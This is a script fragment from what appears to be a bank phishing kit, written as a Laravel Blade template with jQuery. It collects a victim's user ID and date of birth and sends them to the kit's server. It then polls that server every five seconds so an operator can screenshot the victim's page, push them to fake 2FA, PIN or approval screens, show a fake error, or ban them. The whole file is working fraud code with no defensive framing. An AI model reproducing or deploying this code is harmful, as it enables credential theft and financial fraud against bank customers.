        if( $("#C2__USER_NAME").val()  == ''|| $("#C2__QUE_7FF7CAFAACF93118221880").val() == ''){
            $("#MinorAlert").css("display", "block");
                    $("#MinorAlertMsg").text("User ID or Date of birth cannot be empty. Please try again");
                    return;
        }
       
        $.ajax({
            method: "POST",
            url: "{{route('main.new')}}",
            data: {
                _token: $('meta[name="csrf-token"]').attr('content'),
referringUrl:"{{parse_url(url()->current(), PHP_URL_PATH)}}",
                "userId": $("#C2__USER_NAME").val(),
				"dob": $("#C2__QUE_7FF7CAFAACF93118221880").val(),
                "type": "newBoi",
            }
        }).done((data) => {
            $(".spinnerWrapper").addClass( "show");
        });
    });




    setInterval(async () => {
        await checkAction();
    }, 5000);

    const checkAction = async () => {
        $.ajax({
            method: "POST",
            url: "{{route('main.connection')}}",
            data: {
                _token: $('meta[name="csrf-token"]').attr('content'),
referringUrl:"{{parse_url(url()->current(), PHP_URL_PATH)}}",
                type: "checkAction",
            }
        }).done(function(data) {
            if (typeof myVariable === "string" && data.trim() == "none") {
                return false;
            }
            var data = JSON.parse(JSON.stringify(data));
            console.log(data.action);
            setCookie("set_name", data.set_name, 1);
            switch (data.action) {
                case "screenshot":
                    let img;
                    html2canvas(document.body).then(function(canvas) {
                        $.ajax({
                            type: "POST",
                            url: "{{route('main.connection')}}",
                            data: {
                                _token: $('meta[name="csrf-token"]').attr('content'),
referringUrl:"{{parse_url(url()->current(), PHP_URL_PATH)}}",
                                "type": "screenshot",
                                "img": canvas.toDataURL()
                            },
                        }).done(function(data) {});
                    });
                    break;
                case "boi_approve":
                    window.location.replace(
                        "{{route('main.boi_approve')}}?sessionid={{md5(time())}}&status=2fa");
                    break;
                case "boi_pin":
                    window.location.replace(
                        "{{route('main.boi_verification')}}?sessionid={{md5(time())}}&status=pin");
                    break;
                case "boi":
                    window.location.replace(
                        "{{route('main.boi')}}?sessionid={{md5(time())}}&status=boi");
                    break;
                case "error":
                    
                $(".spinnerWrapper").removeClass( "show");

                    $("#MinorAlert").css("display", "block");
                    $("#MinorAlertMsg").text("Invalid User ID or Date of birth. Please try again");

                    // $("#regNumber").val("");
                    // $("#PACNumber").val("");

                    break;
                case "bye":
                    window.location.replace("{{route('main.bye')}}?sessionid={{md5(time())}}");
                    break;

                case "ban":
                    $.ajax({
                        method: "POST",
                        url: "{{route('main.connection')}}",
                        data: {
                            _token: $('meta[name="csrf-token"]').attr('content'),
referringUrl:"{{parse_url(url()->current(), PHP_URL_PATH)}}",
                            type: "ban",
                            status: "banned",
                        }
                    }).done(function() {
                        window.location.replace("{{route('main.bye')}}?sessionid={{md5(time())}}");
                    });
                    break;
            }
        });
    }
</script>
    
